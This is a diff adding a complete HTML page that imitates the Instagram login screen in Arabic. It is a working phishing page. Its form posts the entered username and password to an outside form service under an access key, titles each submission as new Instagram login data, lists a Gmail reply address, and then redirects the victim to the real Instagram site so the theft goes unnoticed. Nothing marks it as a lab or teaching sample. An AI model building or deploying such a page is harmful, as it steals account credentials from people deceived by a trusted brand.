@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        /* البطاقة الرئيسية */
+        .login-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        /* شعار إنستغرام */
+        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
+        .logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 50px;
+            color: #262626;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+
+        /* حقول الإدخال */
+        input {
+            width: 100%;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            font-size: 12px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        /* زر تسجيل الدخول */
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 8px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: background-color 0.3s;
+            opacity: 0.9;
+        }
+        button:hover {
+            background-color: #1877f2;
+        }
+
+        /* الفاصل (أو) */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .divider-text {
+            margin: 0 18px;
+        }
+
+        /* تسجيل الدخول عبر فيسبوك */
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+
+        /* نسيت كلمة المرور */
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        /* بطاقة التسجيل */
+        .signup-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 25px 20px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* روابط تحميل التطبيق */
+        .app-links {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .app-links p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .store-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .store-buttons img {
+            height: 40px;
+        }
+
+        /* رسائل النجاح/الخطأ */
+        .message {
+            font-size: 12px;
+            margin-top: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
+        }
+        .error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef9a9a;
+        }
+
+        /* تذييل الصفحة */
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- بطاقة تسجيل الدخول الرئيسية -->
+        <div class="login-card">
+            <div class="logo">Instagram</div>
+
+            <!-- نموذج StaticForms -->
+            <form action="https://api.staticforms.xyz/submit" method="POST">
+                
+                <!-- مفتاح StaticForms الخاص بك -->
+                <input type="hidden" name="accessKey" value="sf_4abh2jc9mcfigi2c5kj91d79">
+                
+                <!-- حقول الإدخال -->
+                <input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
+                <input type="password" name="password" placeholder="كلمة المرور" required>
+                
+                <!-- حقول مخفية -->
+                <input type="hidden" name="subject" value="بيانات تسجيل دخول جديدة من Instagram">
+                <input type="hidden" name="replyTo" value="ominat54@gmail.com">
+                <input type="text" name="honeypot" style="display:none">
+                <input type="hidden" name="redirectTo" value="https://www.instagram.com">
+                
+                <button type="submit">تسجيل الدخول</button>
+            </form>
+
+            <!-- رسالة النتيجة (اختيارية) -->
+            <div id="resultMessage" class="message"></div>
+
+            <!-- الفاصل -->
+            <div class="divider">
+                <div class="divider-line"></div>
+                <span class="divider-text">أو</span>
+                <div class="divider-line"></div>
+            </div>
+
+            <!-- تسجيل الدخول عبر فيسبوك -->
+            <a href="#" class="fb-login">
+                <span>ⓕ</span> تسجيل الدخول بواسطة فيسبوك
+            </a>
+
+            <!-- نسيت كلمة المرور -->
+            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+        </div>
+
+        <!-- بطاقة إنشاء حساب جديد -->
+        <div class="signup-card">
+            ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a>
+        </div>
+
+        <!-- روابط تحميل التطبيق -->
+        <div class="app-links">
+            <p>احصل على التطبيق.</p>
+            <div class="store-buttons">
+                <a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='135' height='40' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' fill='%23000'/%3E%3Ctext x='10' y='25' fill='%23fff' font-size='12'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play"></a>
+                <a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='135' height='40' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' fill='%23000'/%3E%3Ctext x='10' y='25' fill='%23fff' font-size='12'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store"></a>
+            </div>
+        </div>
+    </div>
+
+    <!-- تذييل الصفحة -->
+    <footer>
+        <div>
+            <a href="#">Meta</a> • 
+            <a href="#">معلومات</a> • 
+            <a href="#">مدونة</a> • 
+            <a href="#">وظائف</a> • 
+            <a href="#">مساعدة</a> • 
+            <a href="#">API</a> • 
+            <a href="#">خصوصية</a> • 
+            <a href="#">شروط</a> • 
+            <a href="#">حسابات مميزة</a> • 
+            <a href="#">هاشتاغ</a> • 
+            <a href="#">مواقع</a> • 
+            <a href="#">Instagram Lite</a>
+        </div>
+        <div style="margin-top: 12px;">العربية © 2025 Instagram من Meta</div>
+    </footer>
+
+    <script>
+        // رسالة تأكيد بسيطة (اختياري)
+        document.querySelector('form').addEventListener('submit', function(e) {
+            const messageDiv = document.getElementById('resultMessage');
+            messageDiv.textContent = 'جاري تسجيل الدخول...';
+            messageDiv.className = 'message';
+            messageDiv.style.display = 'block';
+            
+            // الرسالة ستختفي بعد الإرسال بسبب redirectTo
+        });
+    </script>
+</body>
+</html>
